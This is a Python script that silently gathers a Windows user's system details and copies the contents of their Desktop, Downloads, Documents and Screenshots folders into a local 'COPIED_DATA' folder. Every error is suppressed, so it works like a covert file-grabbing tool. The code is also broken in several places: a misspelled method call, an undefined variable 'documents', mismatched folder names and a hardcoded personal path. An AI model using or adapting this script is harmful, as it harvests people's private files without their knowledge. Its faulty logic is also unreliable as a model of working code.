import platform
import shutil
import sys
import os




class Copy:
    def MainInfo():
        try:
            os.mkdir("COPIED_DATA/MAIN_INFO")
            uname = platform.uname()
            systemInf = "System: " + uname.system
            pcnameInf = "PC Name: " + uname.node
            cdrivernameInf = "C Driver Name: " + (os.path.expanduser("~").replace("Users", "").replace("C:", ""))[2:]
            releaseInf = "Release: " + uname.release
            versionInf = "Version: " + uname.version
            machineInf = "Machine: " + uname.machine
            processorInf = "Processor: " + uname.processor

            information = [systemInf, pcnameInf, cdrivernameInf, releaseInf, versionInf, machineInf, processorInf]
        except Exception:pass

        try:
            with open("C:/Users/canhc/Desktop/SystemInfo.txt", "w") as f: pass
            for i in information:
                with open("COPIED_DATA/MAIN_INFO/SystemInfo.txt", "a") as f:
                    try:f.write(i+"\n")
                    except Exception:pass
        except Exception:pass


    def DesktopFiles():
        try:os.mkdir("COPIED_DATA/DesktopFiles")
        except Exception:pass

        try:desktopfiles = os.listdir(host+"/Desktop/")
        except Exception:pass

        try:
            for file in desktopfiles:
                if(os.path.isdir(file) == True):
                    try:shutil.copytree(host+"/Desktop/"+file, "COPIED_DATA/DesktopFiles/", dirs_exist_ok=True)
                    except Exception:pass
                else:
                    try:shutil.copy2(host+"/Desktop/"+file, "COPIED_DATA/DesktopFiles")
                    except Exception:pass
        except Exception:pass


    def DownloadedFiles():
        try:os.mkdir("COPIED_DATA/DownloadedFiles")
        except Exception:pass

        try:downloadedfiles = os.listdir(host + "/Downloaded/")
        except Exception:pass

        try:
            for file in downloadedfiles:
                if(os.path.isdir(file) == True):
                    try:shutil.copytree(host+"/Downloads/"+file, "COPIED_DATA/DownloadedFiles/", dirs_exist_ok=True)
                    except Exception:pass
                else:
                    try:shutil.copy2(host+"/Downloads/"+file, "COPIED_DATA/DownloadedFiles")
                    except Exception:pass
        except Exception:pass


    def DocumentFiles():
        try:os.mkdir("COPIED_DATA/DocumentFiles")
        except Exception:pass

        try:documentfiles = os.listdir(host + "/Documents/")
        except Exception:pass

        try:
            for file in documents:
                if(os.path.isdir(file) == True):
                    try:shutil.copytree(host+"/Documents/"+file, "COPIED_DATA/DocumentFiles/", dirs_exist_ok=True)
                    except Exception:pass
                else:
                    try:shutil.copy2(host+"/Documents/"+file, "COPIED_DATA/DocumentFiles")
                    except Exception:pass
        except Exception:pass


    def ScreenShots():
        try:os.mkdir("COPIED_DATA/ScreenShots")
        except Exception:pass

        try:documentfiles = os.listdir(host + "/Pictures/Screenshots/")
        except Exception:pass

        try:
            for file in documents:
                if(os.path.isdir(file) == True):
                    try:shutil.copytree(host+"/Pictures/Screenshots/"+file, "COPIED_DATA/ScreenShots/", dirs_exist_ok=True)
                    except Exception:pass
                else:
                    try:shutil.copy2(host+"/Pictures/Screenshots/"+file, "COPIED_DATA/ScreenShots")
                    except Exception:pass
        except Exception:pass




if (__name__ == '__main__'):
    global host
    host = os.path.expanduser("~")

    #Create Main Folder
    try:
        os.mkdir("COPIED_DATA")
    except Exception:
        sys.exit()

    Copy.MainInfo()
    Copy.DesktopFiles()
    Copy.DownloadadFiles()
    Copy.DocumentFiles()
    Copy.ScreenShots()